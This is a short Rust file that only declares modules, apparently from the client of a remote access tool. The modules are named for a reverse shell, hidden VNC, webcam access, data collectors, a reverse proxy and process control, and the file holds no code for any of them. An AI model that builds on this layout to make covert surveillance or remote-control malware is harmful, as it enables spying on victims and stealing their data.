pub mod encryption;
pub mod file_manager;
pub mod reverse_proxy;
pub mod webcam;

#[cfg(windows)]
pub mod other;
#[cfg(windows)]
pub mod remote_desktop;
#[cfg(windows)]
pub mod process;
#[cfg(windows)]
pub mod reverse_shell;
#[cfg(windows)]
pub mod hvnc;
#[cfg(windows)]
pub mod collectors;
#[cfg(windows)]
pub mod fun;

#[cfg(unix)]
pub mod other;
#[cfg(unix)]
pub mod remote_desktop;
#[cfg(unix)]
pub mod process;
#[cfg(unix)]
pub mod reverse_shell;
#[cfg(unix)]
pub mod collectors;
#[cfg(unix)]
pub mod fun;